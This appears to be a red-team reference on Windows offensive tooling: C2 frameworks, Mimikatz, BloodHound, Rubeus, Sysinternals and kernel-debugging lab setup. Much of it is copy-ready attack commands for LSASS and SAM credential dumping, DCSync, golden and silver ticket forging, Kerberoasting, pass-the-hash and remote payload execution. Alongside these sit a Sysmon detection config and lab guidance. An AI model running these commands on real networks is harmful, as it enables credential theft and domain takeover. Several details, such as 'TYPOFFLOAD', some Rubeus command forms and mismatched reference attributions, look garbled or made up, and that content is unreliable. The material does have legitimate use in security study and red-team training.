# Offensive Tooling & Infrastructure — C2 Frameworks, Mimikatz, BloodHound, Rubeus & Lab Setup

> A deep-technical reference on offensive tooling for Windows: Cobalt Strike, Sliver, Mythic C2 frameworks, Mimikatz architecture, BloodHound/SharpHound AD recon, Rubeus Kerberos attacks, Sysinternals post-exploitation, and WinDBG kernel debugging. Includes lab setup recommendations. Written for red teamers and security researchers.

---

## Table of Contents

1. [C2 Frameworks](#1-c2-frameworks)
2. [Mimikatz Architecture & Capabilities](#2-mimikatz-architecture--capabilities)
3. [BloodHound & SharpHound](#3-bloodhound--sharphound)
4. [Rubeus: Kerberos Attack Toolkit](#4-rubeus-kerberos-attack-toolkit)
5. [Sysinternals Suite for Post-Exploitation](#5-sysinternals-suite-for-post-exploitation)
6. [WinDBG & cdb for Kernel Debugging](#6-windbg--cdb-for-kernel-debugging)
7. [Lab Setup Recommendations](#7-lab-setup-recommendations)

---

## 1. C2 Frameworks

### 1.1 Cobalt Strike

Cobalt Strike is the industry-standard commercial C2 framework used by red teams and advanced threat actors:

```
Cobalt Strike Architecture:
┌─────────────────────────────────────────────────────────────────┐
│ Team Server (C2 Infrastructure)                                 │
│  ┌──────────────────────────────────────────────────────────┐  │
│  │ Cobalt Strike Team Server                                │  │
│  │  - Listens on port 55553 (team server)                  │  │
│  │  - Hosts listener profiles (HTTP/S, DNS, SMB, TCP)      │  │
│  │  - Manages beacon sessions                               │  │
│  │  - Stores data (logs, screenshots, keystrokes)            │  │
│  │  - Aggressor scripting (extend with Python-like scripts)  │  │
│  └──────────────────────────────────────────────────────────┘  │
│                         │                                        │
│  ┌──────────────────┐  │  ┌──────────────────┐                  │
│  │ Cobalt Strike     │  │  │ Cobalt Strike    │                  │
│  │ Client (Operator)│──┼──│ Client (Operator)│                  │
│  └──────────────────┘  │  └──────────────────┘                  │
│                         │                                        │
│  ┌──────────────────────▼───────────────────────────────────┐  │
│  │ Redirectors (Apache/Nginx/Caddy)                        │  │
│  │  - Domain fronting                                      │  │
│  │  - Malleable C2 profiles                                │  │
│  │  - HTTPS proxying to team server                        │  │
│  └──────────────────────────────────────────────────────────┘  │
│                                                                   │
│  ┌──────────────────────────────────────────────────────────┐  │
│  │ Beacons (Implants on Target Systems)                      │  │
│  │  - HTTP/S beacon                                        │  │
│  │  - DNS beacon                                            │  │
│  │  - SMB beacon (peer-to-peer)                            │  │
│  │  - TCP beacon (peer-to-peer)                            │  │
│  └──────────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────┘
```

**Beacon (Implant) Capabilities:**

| Command | Category | Description |
|---------|----------|-------------|
| `shell` | Execution | Execute command via cmd.exe |
| `run` | Execution | Execute command without cmd.exe |
| `execute` | Execution | Execute program without output |
| `powershell` | Execution | Execute PowerShell command |
| `powerpick` | Execution | Unmanaged PowerShell (bypass AMSI) |
| `psinject` | Execution | Inject into remote process |
| `spawn` | Execution | Spawn sacrificial process |
| `upload` | File Ops | Upload file to target |
| `download` | File Ops | Download file from target |
| `socks` | Pivoting | Start SOCKS proxy |
| `portscan` | Recon | Port scan |
| `hashdump` | Credentials | Dump SAM hashes |
| `logonpasswords` | Credentials | Dump LSASS (Mimikatz) |
| `kerberos_ticket_purge` | Kerberos | Purge Kerberos tickets |
| `kerberos_ticket_use` | Kerberos | Apply Kerberos ticket |
| `getuid` | Status | Get current user |
| `getpid` | Status | Get current process ID |
| `getsystem` | Privilege | Escalate to SYSTEM |

**Malleable C2 Profiles:**

```
# Malleable C2 Profile Example (HTTP)
set sleeptime "30000";        # 30 second sleep
set jitter    "20";           # 20% jitter
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)";

http-get {
    set uri "/search";
    client {
        header "Accept" "text/html,application/xhtml+xml";
        header "Cookie" "session=__SESSION_ID__; __path=__BEACON_DATA__";
        metadata {
            base64url;
            header "X-Metadata";
        }
    }
    server {
        header "Content-Type" "text/html";
        header "Cache-Control" "no-cache";
        output {
            print;
        }
    }
}

http-post {
    set uri "/submit";
    client {
        header "Content-Type" "application/octet-stream";
        id {
            parameter "id";
        }
        output {
            print;
        }
    }
    server {
        header "Content-Type" "text/html";
        output {
            print;
        }
    }
}
```

### 1.2 Sliver

Sliver is an open-source C2 framework designed for red team operations:

```
Sliver Architecture:
- Operator: CLI/grpc UI for operators
- Server: C2 server (Go binary, cross-platform)
- Implant: Compiled Go binary (or DLL) for target
- DNS/HTTP/HTTPS/MTLS/WireGuard listeners
- Multiplayer mode: Multiple operators on same server
- Armory: Community module repository
```

**Key Differences from Cobalt Strike:**

| Feature | Cobalt Strike | Sliver |
|---------|--------------|--------|
| License | Commercial ($3500+/yr) | Open source (GPL-3.0) |
| Implant language | C/C++ | Go |
| Implant compilation | Pre-compiled | On-demand per target |
| Malleable C2 | Yes (profiles) | Yes (HTTP C2 profiles) |
| Evasion | Arsenal Kit, Artifact Kit | Custom (manual) |
| BOF (Beacon Object Files) | Yes | Yes (COFF loader) |
| Multiplayer | Yes | Yes |
| DNS over HTTPS | Yes | Yes |
| TYPOFFLOAD | Yes | No |

### 1.3 Mythic

Mythic is a cross-platform C2 framework with a dashboard-based UI:

```
Mythic Architecture:
┌────────────────────────────────────────┐
│ Mythic Server (Docker)                  │
│  - Web UI (React)                      │
│  - API (Python/FastAPI)                │
│  - Database (PostgreSQL)               │
│  - RabbitMQ (message queue)            │
│                                        │
│  ┌─────────────────────────────────┐   │
│  │ Containerized C2 Payloads:      │   │
│  │  - Apollo (.NET)                │   │
│  │  - Athena (JavaScript)          │   │
│  │  - Hermes (Rust)                │   │
│  │  - Medusa (Python)              │   │
│  │  - Poseidon (Go)               │   │
│  │  - Mercury (C#)                │   │
│  │  -iche (Custom)                │   │
│  └─────────────────────────────────┘   │
└────────────────────────────────────────┘
```

---

## 2. Mimikatz Architecture & Capabilities

### 2.1 Mimikatz Overview

Mimikatz is the most widely-used credential extraction tool for Windows. Created by Benjamin Delpy (`@gentilkiwi`), it provides deep access to Windows authentication mechanisms:

```
Mimikatz Module Architecture:
┌──────────────────────────────────────────────────────────┐
│ mimikatz.exe                                              │
│  ┌──────────────────────────────────────────────────┐  │
│  │ Command Parser (mimikatz.c)                       │  │
│  │  ├── sekurlsa::  (LSA security packages)          │  │
│  │  ├── kerberos:: (Kerberos tickets)                │  │
│  │  ├── lsadump::  (LSASS dump)                      │  │
│  │  ├── crypto::   (Crypto API)                     │  │
│  │  ├── privilege:: (Token privileges)                │  │
│  │  ├── process::  (Process operations)               │  │
│  │  ├── service::  (Service operations)               │  │
│  │  ├── lsadump::  (Registry SAM)                   │  │
│  │  ├── vault::    (Credential Vault)                │  │
│  │  ├── dpapi::    (DPAPI master keys)               │  │
│  │  ├── event::    (Event log)                        │  │
│  │  ├── token::    (Token manipulation)               │  │
│  │  └── misc::     (Miscellaneous)                   │  │
│  └──────────────────────────────────────────────────┘  │
│  ┌──────────────────────────────────────────────────┐  │
│  │ Library Layer                                      │  │
│  │  ├── kuhl_m_sekurlsa.c (credential extraction)     │  │
│  │  ├── kuhl_m_kerberos.c (Kerberos operations)       │  │
│  │  ├── kuhl_m_lsadump.c (LSA database dump)          │  │
│  │  ├── kuhl_m_dpapi.c (DPAPI operations)             │  │
│  │  └── kuhl_m_crypto.c (Crypto operations)           │  │
│  └──────────────────────────────────────────────────┘  │
│  ┌──────────────────────────────────────────────────┐  │
│  │ System Layer                                       │  │
│  │  ├── kull_m_remotelib.c (Remote operations)         │  │
│  │  ├── kull_m_handle.c (Handle operations)            │  │
│  │  ├── kull_m_process.c (Process operations)          │  │
│  │  ├── kull_m_memory.c (Memory operations)            │  │
│  │  ├── kull_m_token.c (Token operations)              │  │
│  │  └── kull_m_crypto.c (Crypto operations)            │  │
│  └──────────────────────────────────────────────────┘  │
└──────────────────────────────────────────────────────────┘
```

### 2.2 Key Mimikatz Commands

```
Credential Extraction:
═
mimikatz # sekurlsa::logonpasswords
  Extracts passwords from LSASS memory (requires SeDebugPrivilege or SYSTEM)
  Outputs: domain, username, NTLM hash, Kerberos keys, clear-text passwords

mimikatz # sekurlsa::wdigest
  Extracts WDigest credentials (clear-text, if UseLogonCredential=1)

mimikatz # sekurlsa::msv
  Extracts MSV1_0 credentials (NTLM hashes)

mimikatz # sekurlsa::kerberos
  Extracts Kerberos tickets and keys

mimikatz # sekurlsa::tspkg
  Extracts TSPKG (Schannel) credentials

mimikatz # sekurlsa::livessp
  Extracts LiveSSP credentials

mimikatz # sekurlsa::ssp
  Extracts SSP credentials

Kerberos Operations:
═
mimikatz # kerberos::list /export
  Lists and exports Kerberos tickets

mimikatz # kerberos::ptt <ticket.kirbi>
  Pass-the-ticket (injects Kirbi ticket into current session)

mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:<hash>
  Creates a Golden Ticket (requires KRBTGT hash)

mimikatz # kerberos::silver /user: Administrator /domain:corp.local /sid:S-1-5-21-... /target:web.corp.local /service:HTTP /rc4:<hash>
  Creates a Silver Ticket (requires service account hash)

LSA Database Operations:
═
mimikatz # lsadump::sam /system:SYSTEM /sam:SAM
  Dumps local SAM hashes from offline hive files

mimikatz # lsadump::lsa /patch
  Dumps domain password hashes from NTDS.DIT (requires DC access)

mimikatz # lsadump::dcsync /user:Administrator
  DCSync attack (replicates domain controller to extract hashes)

mimikatz # lsadump::cache
  Dumps domain cached credentials (DCC2)

Token Operations:
═
mimikatz # privilege::debug
  Enables SeDebugPrivilege

mimikatz # token::elevate /domain:corp.local /user:Administrator
  Elevates to specified user's token

mimikatz # token::revert
  Reverts to original token

DPAPI Operations:
═
mimikatz # dpapi::cred /in:C:\Users\user\AppData\Local\Microsoft\Credentials\<guid>
  Decrypts DPAPI-protected credentials

mimikatz # dpapi::masterkey /in:<mk_file> /sid:<sid> /password:<password>
  Decrypts DPAPI master key

mimikatz # dpapi::vault /in:<vault_file>
  Decrypts Windows Vault credentials
```

### 2.3 Mimikatz LSASS Dumping Methods

```powershell
# Method 1: Direct LSASS memory reading (requires SeDebugPrivilege)
mimikatz # sekurlsa::logonpasswords

# Method 2: LSASS process dump + offline analysis
# Task Manager method (requires admin + SeDebugPrivilege):
# Right-click lsass.exe → Create dump file

# Procdump method (Sysinternals, signed binary):
procdump -accepteula -ma lsass.exe lsass.dmp
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords

# Comsvcs.dll method (LOLBIN):
rundll32 comsvcs.dll MiniDump <lsass_pid> C:\lsass.dmp full

# Method 3: Registry SAM dump (offline)
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive
reg save HKLM\SECURITY security.hive
mimikatz # lsadump::sam /system:system.hive /sam:sam.hive

# Method 4: DCSync (remote, no LSASS access needed)
mimikatz # lsadump::dcsync /domain:corp.local /user:Administrator
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt
```

---

## 3. BloodHound & SharpHound

### 3.1 BloodHound Architecture

BloodHound is a tool for analyzing Active Directory trust relationships and attack paths:

```
BloodHound Data Flow:
┌─────────────────────────────────────────────────────────────┐
│ SharpHound (Data Collector)                                   │
│  ├── LDAP enumeration (users, groups, computers, GPOs)        │
│  ├── Session enumeration (NetSessionEnum, NetWkstaUserEnum)  │
│  ├── ACL enumeration (ACEs on all AD objects)               │
│  ├── Trust enumeration (domain/forest trusts)                │
│  ├── Local group enumeration (Administrators on targets)    │
│  └── SPN enumeration (Kerberoastable accounts)             │
│         │                                                      │
│         │ JSON output                                          │
│         ▼                                                      │
│ BloodHound (Neo4j Graph Database)                            │
│  ├── Neo4j database (nodes and edges)                        │
│  ├── Web UI (visualization)                                  │
│  └── Cypher query engine (attack path analysis)              │
│                                                               │
│ Pre-built Queries:                                            │
│  ├── Shortest path to Domain Admins                          │
│  ├── Find all paths between two nodes                        │
│  ├── Users with DCSync rights                                │
│  ├── Computers where Domain Admins have sessions              │
│  ├── Kerberoastable users                                    │
│  ├── Edge abuse (ForceChangePassword, AddMember, etc.)      │
│  └── Unconstrained delegation targets                         │
└─────────────────────────────────────────────────────────────┘
```

### 3.2 SharpHound Collection Methods

```powershell
# SharpHound data collection:
# Method 1: All collection methods
SharpHound.exe -c all

# Method 2: Specific collection methods
SharpHound.exe -c Session,Group,ACL,Trust,LocalAdmin

# Method 3: Stealthy collection (no session enumeration)
SharpHound.exe -c Group,ACL,Trust,LocalAdmin --Stealth

# Method 4: Domain-specific collection
SharpHound.exe -d corp.local -c all

# Method 5: Forest-level collection
SharpHound.exe -c all --forest corp.local --ldapusername user --ldappassword pass

# Method 6: Using PowerShell module
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -Domain corp.local

# BloodHound Cypher Queries for Attack Path Analysis:
# Find shortest path to Domain Admins
MATCH p=shortestPath((u:User)-[:AdminTo|HasSession|MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})) RETURN p

# Find all users with DCSync rights
MATCH (u:User)-[:GenericAll|WriteDacl|WriteOwner|Owns*1..]->(d:Domain) RETURN u.name

# Find Kerberoastable users
MATCH (u:User {hasspn:true}) WHERE NOT u.name STARTS WITH "KRBTGT" RETURN u.name

# Find computers with unconstrained delegation
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name

# Find paths from owned user to high-value targets
MATCH p=shortestPath((u:User {owned:true})-[:AdminTo|HasSession|MemberOf|GenericAll|ForceChangePassword*1..]->(t:User {admincount:true})) RETURN p
```

---

## 4. Rubeus: Kerberos Attack Toolkit

### 4.1 Rubeus Overview

Rubeus is a C# toolset for raw Kerberos protocol interaction and abuse:

```
Rubeus Attack Methods:
┌─────────────────────────────────────────────────────────┐
│ Kerberoasting                                            │
│  ├── Rubeus.exe kerberoast                             │
│  ├── Extracts SPN tickets for offline cracking          │
│  └── Targets: Service accounts with SPNs               │
├─────────────────────────────────────────────────────────┤
│ AS-REP Roasting                                        │
│  ├── Rubeus.exe asreproast                            │
│  ├── Targets users with "Do not require Kerberos       │
│  │   preauthentication" enabled                        │
│  └── No domain access needed (just username list)      │
├─────────────────────────────────────────────────────────┤
│ Overpass-the-Hash (Pass-the-Key)                       │
│  ├── Rubeus.exe hash /user:admin /rc4:<hash>          │
│  │   Rubeus.exe s4u /user:admin /rc4:<hash> /impersonate:target │
│  ├── Uses NTLM hash to request Kerberos tickets        │
│  └── Bypasses NTLM restrictions                        │
├─────────────────────────────────────────────────────────┤
│ Pass-the-Ticket                                         │
│  ├── Rubeus.exe ptt /ticket:<base64_kirbi>            │
│  ├── Injects Kirbi ticket into current session         │
│  └── Works across domain trusts                         │
├─────────────────────────────────────────────────────────┤
│ Golden Ticket                                           │
│  ├── Rubeus.exe golden /user:Administrator            │
│  │   /domain:corp.local /sid:S-1-5-21-... /krbtgt:<hash>│
│  ├── Forges TGT with KRBTGT hash                       │
│  └── Unlimited persistence until TGT expires            │
├─────────────────────────────────────────────────────────┤
│ Silver Ticket                                           │
│  ├── Rubeus.exe silver /user:Administrator            │
│  │   /domain:corp.local /sid:S-1-5-21-...            │
│  │   /target:web.corp.local /service:HTTP /rc4:<hash> │
│  ├── Forges TGS with service account hash              │
│  └── Access to specific service only                    │
├─────────────────────────────────────────────────────────┤
│ Diamond Ticket                                          │
│  ├── Rubeus.exe diamond /user:Administrator           │
│  │   /domain:corp.local /sid:S-1-5-21-...            │
│  │   /krbtgt:<hash> /ptt                             │
│  ├── Modifies legitimate TGT                            │
│  └── More stealthy than Golden Ticket                   │
└─────────────────────────────────────────────────────────┘
```

### 4.2 Key Rubeus Commands

```powershell
# Kerberoast attack
Rubeus.exe kerberoast /outfile:hashes.txt /domain:corp.local
# Crack with Hashcat:
hashcat -m 13100 hashes.txt wordlist.txt

# AS-REP Roasting attack
Rubeus.exe asreproast /outfile:asrep_hashes.txt /domain:corp.local
# Or targeted:
Rubeus.exe asreproast /user:admin /domain:corp.local /outfile:asrep.txt

# Overpass-the-Hash
Rubeus.exe hash /user:admin /domain:corp.local /rc4:<ntlm_hash>
# Creates Kerberos TGT from NTLM hash
Rubeus.exe asktgt /user:admin /domain:corp.local /rc4:<ntlm_hash> /ptt
# Inject TGT into current session

# Pass-the-Ticket
Rubeus.exe ptt /ticket:<base64_kirbi>
# Or from file:
Rubeus.exe ptt /ticket:C:\tickets\admin.kirbi

# S4U (Service for User) attack
# Constrain delegation abuse:
Rubeus.exe s4u /user:svc_mssql /domain:corp.local /rc4:<hash> /impersonateuser:administrator /msdsspn:http/web.corp.local /ptt

# DCSync (via LSADump wrapper)
Rubeus.exe dump /service:krbtgt /domain:corp.local

# Monitor Kerberos tickets
Rubeus.exe monitor /interval:10 /filter:krbtgt

# Display current tickets
Rubeus.exe klist

# Create and inject Golden Ticket
Rubeus.exe golden /user:Administrator /domain:corp.local /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:<krbtgt_hash> /ptt

# Create and inject Silver Ticket (HTTP service)
Rubeus.exe silver /user:Administrator /domain:corp.local /sid:S-1-5-21-123456789-123456789-123456789 /target:web.corp.local /service:HTTP /rc4:<service_hash> /ptt
```

---

## 5. Sysinternals Suite for Post-Exploitation

### 5.1 Key Sysinternals Tools

| Tool | Purpose | Post-Exploitation Use |
|------|---------|----------------------|
| **PsExec** | Remote process execution | Lateral movement |
| **PsList** | Process listing | Reconnaissance |
| **PsKill** | Process termination | Defense evasion |
| **PsInfo** | System information | Reconnaissance |
| **PsLoggedOn** | Logged-on users | Targeting |
| **PsService** | Service management | Service manipulation |
| **PsShutdown** | Remote shutdown | Denial of service |
| **AccessChk** | ACL analysis | Privilege escalation |
| **AccessEnum** | ACL enumeration | Misconfiguration discovery |
| **AutoRuns** | Startup programs | Persistence identification |
| **ProcDump** | Process dump | Credential extraction |
| **ProcExp** | Process explorer | Handle/DLL analysis |
| **ProcMon** | Process monitor | Behavior analysis |
| **SysMon** | System monitor | EDR-like monitoring |
| **TCPView** | Network connections | Network recon |
| **WinObj** | Object Manager viewer | NT namespace analysis |
| **Handle** | Handle viewer | Handle inheritance analysis |
| **PipeList** | Named pipe listing | Named pipe impersonation |
| **SigCheck** | File signature verification | Binary analysis |
| **Strings** | String extraction | Binary analysis |
| **SDelete** | Secure file deletion | Evidence destruction |

### 5.2 PsExec Lateral Movement

```cmd
# PsExec for lateral movement:
# Method 1: With credentials
PsExec.exe \\target.corp.local -u corp\admin -p password cmd.exe

# Method 2: With pass-the-hash (via Mimikatz + PsExec)
# First, elevate to admin
mimikatz # sekurlsa::logonpasswords
# Extract NTLM hash
# Then use PsExec with hash
PsExec.exe \\target.corp.local -u corp\admin -p <NTLMhash> cmd.exe

# Method 3: PsExec alternative (without Sysinternals)
# Using WMI (more stealthy):
wmic /node:target.corp.local /user:corp\admin /password:pass process call create "cmd.exe /c C:\temp\payload.exe"

# Using PowerShell Remoting:
Enter-PSSession -ComputerName target.corp.local -Credential corp\admin

# Using DCOM:
$com = [Type]::GetTypeFromProgID("Shell.Application","target.corp.local")
$shell = [Activator]::CreateInstance($com)
$shell.ShellExecute("cmd.exe","/c C:\temp\payload.exe")
```

### 5.3 Sysmon for Defense

```xml
<!-- Sysmon configuration for detection -->
<Sysmon schemaversion="4.50">
  <HashAlgorithms>md5,sha256,IMPHASH</HashAlgorithms>
  <EventFiltering>
    <!-- Detect Mimikatz -->
    <RuleGroup name="MimikatzDetection" groupRelation="or">
      <ProcessCreate onmatch="include">
        <Image condition="contains">mimikatz</Image>
        <Image condition="contains">sekurlsa</Image>
        <CommandLine condition="contains">logonpasswords</CommandLine>
        <CommandLine condition="contains">lsadump::dcsync</CommandLine>
      </ProcessCreate>
    </RuleGroup>
    
    <!-- Detect credential dumping -->
    <RuleGroup name="CredentialDumping" groupRelation="or">
      <ProcessCreate onmatch="include">
        <Image condition="is">C:\Windows\System32\procdump.exe</Image>
        <CommandLine condition="contains">-ma lsass.exe</CommandLine>
        <CommandLine condition="contains">comsvcs.dll MiniDump</CommandLine>
        <TargetImage condition="is">lsass.exe</TargetImage>
      </ProcessCreate>
    </RuleGroup>
    
    <!-- Detect LOLBin abuse -->
    <RuleGroup name="LOLBins" groupRelation="or">
      <ProcessCreate onmatch="include">
        <Image condition="is">C:\Windows\System32\certutil.exe</Image>
        <CommandLine condition="contains">-urlcache -split -f</CommandLine>
        <Image condition="is">C:\Windows\System32\mshta.exe</Image>
        <Image condition="is">C:\Windows\SysWOW64\mshta.exe</Image>
      </ProcessCreate>
    </RuleGroup>
  </EventFiltering>
</Sysmon>
```

---

## 6. WinDBG & cdb for Kernel Debugging

### 6.1 WinDBG Kernel Debugging Setup

```
WinDBG Kernel Debugging Setup:
1. Target Machine (VM):
   bcdedit /debug on
   bcdedit /dbgsettings net hostip:<HOST_IP> port:<PORT>
   (or) bcdedit /dbgsettings serial baudrate:115200 /channel:com1

2. Host Machine:
   windbg -k net:port=<PORT>,target=<TARGET_IP>
   (or) windbg -k com:port=\\.\pipe\com_1,baud=115200,pipe

3. Connection:
   - Network debugging (KDNET): Recommended for performance
   - Serial debugging: Virtual COM port (VMware/VirtualBox)
   - 1394 (FireWire): Legacy, not recommended
   - USB: Limited support

4. Symbols:
   .sympath srv*C:\Symbols*https://msdl.microsoft.com/download/symbols
   .reload

5. Extensions:
   .load kdexts        ; Standard kernel extensions
   .load win32kext     ; Win32k extensions
   .load httpext       ; HTTP extensions
```

### 6.2 Essential WinDBG Commands

```
Process/Thread Commands:
  !process 0 0                     ; List all processes (summary)
  !process 0 7                     ; List all processes (detailed)
  !process <addr> 7                ; Show specific process
  .process /r /p <addr>            ; Switch to process context (reload symbols)
  .process /r /m <addr>             ; Switch process (dump mode)
  !thread                          ; Show current thread
  .thread <addr>                   ; Switch to thread

Memory/Pool Commands:
  !pool <addr>                     ; Show pool header
  !poolfind <tag>                 ; Find all allocations with tag
  !poolused <tag>                  ; Show pool usage by tag
  dd/dq <addr>                     ; Display memory
  dt _EPROCESS <addr>              ; Display EPROCESS
  dt _ETHREAD <addr>               ; Display ETHREAD
  !address <addr>                  ; Show address information

Object Manager Commands:
  !object \??\C:                 ; Show NT namespace object
  !object <addr>                  ; Show object at address
  !handle <pid>                    ; Show handles for process

Win32k Commands:
  !win32k                          ; Show Win32k information
  !gdi                             ; Show GDI information
  !gdihandles                      ; Show GDI handle count
  !userhandle <handle>              ; Show Win32k handle

Breakpoint Commands:
  bp nt!NtCreateFile              ; Break on NtCreateFile
  bp win32k!xxxCreateWindowEx       ; Break on Win32k window creation
  ba w4 <addr>                     ; Data breakpoint (write watchpoint)
  ba e1 <addr>                     ; Execution breakpoint

Symbol Commands:
  x nt!*Process*                  ; Find symbols matching pattern
  x win32k!*Window*               ; Find Win32k symbols
  ln <addr>                        ; Lookup nearest symbol
```

### 6.3 Kernel Exploit Debugging Workflow

```
Kernel Exploit Debugging Workflow:
1. Set up kernel debugging (see Section 6.1)
2. Load symbols:
   .sympath srv*C:\Symbols*https://msdl.microsoft.com/download/symbols
   .reload /f ntoskrnl.exe win32k.sys
3. Set breakpoints on target function:
   bp nt!NtCreateFile
   bp win32k!xxxCreateWindowEx
4. Run exploit on target VM
5. When breakpoint hits, examine state:
   !process -1 0              ; Show current process
   dt _EPROCESS <addr>       ; Examine process structure
   !pool <addr>              ; Examine pool allocation
6. Step through exploit:
   p (step over) / t (step into)
7. Examine corrupted memory:
   dd <addr> L100            ; Dump 100 DWORDs
   !pool <addr>              ; Verify pool corruption
   !poolfind <tag>           ; Find target allocations
8. Verify token swap:
   dt _EPROCESS <addr> Token ; Show process token
   !token <addr>             ; Show token details
9. Continue execution:
   g                          ; Go (continue)
```

---

## 7. Lab Setup Recommendations

### 7.1 AD Lab Architecture

A comprehensive Windows security lab requires multiple machines with Active Directory:

```
Recommended Lab Architecture:
┌───────────────────────────────────────────────────────────────┐
│ Domain: CORP.LOCAL                                            │
│  ┌─────────────────────────────────────────────────────────┐  │
│  │ DC01 (Windows Server 2022)                              │  │
│  │ - Domain Controller                                     │  │
│  │ - DNS, DHCP, Active Directory                           │  │
│  │ - Certificate Authority (AD CS)                         │  │
│  │ - Group Policy Management                              │  │
│  └─────────────────────────────────────────────────────────┘  │
│  ┌─────────────────────────────────────────────────────────┐  │
│  │ FS01 (Windows Server 2022)                              │  │
│  │ - File Server                                           │  │
│  │ - SMB shares (HR, Finance, IT)                           │  │
│  │ - DFS Replication                                       │  │
│  └─────────────────────────────────────────────────────────┘  │
│  ┌─────────────────────────────────────────────────────────┐  │
│  │ WS01 (Windows 11)                                       │  │
│  │ - Workstation (Standard User)                           │  │
│  │ - Microsoft Office, Edge                                │  │
│  │ - Local admin for privilege escalation testing          │  │
│  └─────────────────────────────────────────────────────────┘  │
│  ┌─────────────────────────────────────────────────────────┐  │
│  │ WS02 (Windows 11)                                       │  │
│  │ - Workstation (Admin User)                              │  │
│  │ - Domain Admin for lateral movement testing             │  │
│  └─────────────────────────────────────────────────────────┘  │
│  ┌─────────────────────────────────────────────────────────┐  │
│  │ SQL01 (Windows Server 2022)                             │  │
│  │ - SQL Server                                            │  │
│  │ - Service accounts (SPN targets for Kerberoasting)      │  │
│  └─────────────────────────────────────────────────────────┘  │
│  ┌─────────────────────────────────────────────────────────┐  │
│  │ WEB01 (Windows Server 2022)                             │  │
│  │ - IIS Web Server                                         │  │
│  │ - Constrained delegation targets                       │  │
│  └─────────────────────────────────────────────────────────┘  │
│  ┌─────────────────────────────────────────────────────────┐  │
│  │ KALI (Linux)                                             │  │
│  │ - Attack machine                                         │  │
│  │ - Cobalt Strike/Sliver team server                      │  │
│  │ - BloodHound, Rubeus, Mimikatz                          │  │
│  │ - Impacket tools                                        │  │
│  └─────────────────────────────────────────────────────────┘  │
└───────────────────────────────────────────────────────────────┘
```

### 7.2 Kernel Exploitation Lab

```
Kernel Exploitation Lab Setup:
┌────────────────────────────────────────────────────────────┐
│ Host Machine (Linux/Windows)                                │
│  - WinDBG Preview (from Microsoft Store)                    │
│  - IDA Pro / Ghidra                                         │
│  - Visual Studio 2022 (C/C++ development)                 │
│  - Python 3 (exploit scripting)                             │
│                                                              │
│ Target VM (Windows 10/11)                                    │
│  - Kernel debugging enabled (bcdedit /debug on)            │
│  - Driver Verifier enabled (verifier.exe)                   │
│  - Test-signed drivers enabled (bcdedit /set testsigning on)│
│  - WinDBG kernel debug configured (KDNET or serial)        │
│  - Multiple snapshots (VM restore points)                  │
│  - Multiple Windows versions (7, 10, 11) for offset testing│
│                                                              │
│ Vulnerable Drivers (for practice)                            │
│  - HackSysExtremeVulnerableDriver (HEVD)                    │
│  - RTCore64.sys (MSI Afterburner, CVE-2022-42043)          │
│  - DBUtil_2_3.sys (Dell, CVE-2021-21551)                  │
│  - AsIO.sys (ASUS, arbitrary read/write)                     │
│  - capcom.sys (Capcom, arbitrary ioctl)                      │
│  - PROCEXP152.sys (Sysinternals, information leak)           │
│                                                              │
│ Debugging Configuration                                      │
│  - KDNET (network debugging) on port 50000                  │
│  - Serial debugging on COM1 (VMware/VirtualBox)             │
│  - Symbol server: msdl.microsoft.com/download/symbols      │
│  - Local symbol cache: C:\Symbols                            │
└────────────────────────────────────────────────────────────┘
```

### 7.3 Essential Tools Installation

```powershell
# Install essential tools for Windows security research:
# (Run as Administrator)

# Sysinternals Suite
Invoke-WebRequest -Uri "https://download.sysinternals.com/files/SysinternalsSuite.zip" -OutFile C:\Tools\SysinternalsSuite.zip
Expand-Archive C:\Tools\SysinternalsSuite.zip -DestinationPath C:\Tools\Sysinternals

# Mimikatz
Invoke-WebRequest -Uri "https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip" -OutFile C:\Tools\mimikatz.zip
Expand-Archive C:\Tools\mimikatz.zip -DestinationPath C:\Tools\mimikatz

# BloodHound
# Install Neo4j: choco install neo4j
# Install BloodHound: choco install bloodhound

# Rubeus
Invoke-WebRequest -Uri "https://github.com/GhostPack/Rubeus/releases/latest/download/Rubeus.zip" -OutFile C:\Tools\Rubeus.zip

# SharpHound
Invoke-WebRequest -Uri "https://github.com/BloodHoundAD/BloodHound/releases/latest/download/SharpHound.exe" -OutFile C:\Tools\SharpHound.exe

# WinDBG Preview
# Install from Microsoft Store: windbg

# Impacket (Python)
pip install impacket

# Cracking tools
# Hashcat: choco install hashcat
# John the Ripper: choco install john

# Network tools
# Wireshark: choco install wireshark
# Nmap: choco install nmap
```

---

> **Cross-references**:
> - AD attacks → `→ 06a_active_directory_attacks`
> - Defense evasion → `→ 06b_defense_evasion_lateral`
> - Malware techniques → `→ 05a_windows_malware_techniques`
> - Windows hardening → `→ 07a_windows_hardening_baseline`
> - Linux C2 comparison → `→ linux_kernel` track

---

## References

1. MITRE ATT&CK. "Command and Control — T1071." <https://attack.mitre.org/techniques/T1071/> — C2 communication protocols and channel selection.
2. MITRE ATT&CK. "Credential Dumping — T1003." <https://attack.mitre.org/techniques/T1003/> — LSASS access and Mimikatz methodology.
3. MITRE ATT&CK. "Kerberoasting — T1558.003." <https://attack.mitre.org/techniques/T1558/003/>
4. Chester, A. "Mimikatz Architecture and Capabilities." *XPN InfoSec Blog*, 2022. — SecLogon, sekurlsa, and credential extraction deep dive.
5. McGarr, C. "BloodHound Methodology." *Connor McGarr's Blog*, 2023. — SharpHound collection methods, Cypher queries, and attack path analysis.
6. Rasthofer, J. "Rubeus: Kerberos Attack Toolkit." *Harmj0y Blog*, 2021. — AS-REP roasting, Kerberoasting, S4U, and diamond ticket attacks.
7. Cobalt Strike Documentation. "Operator's Manual." *HelpSystems*, 2023. — Beacon, malleable C2, and post-exploitation framework.
8. Sliver Documentation. "Operator's Guide." *Bishop Fox*, 2023. — Implant, C2 channels, and extension framework.
9. Dedić, K. "Mythic C2 Framework Architecture." *ItsAFeature*, 2022. — Agent-based C2, Mythic UI, and containerized deployment.
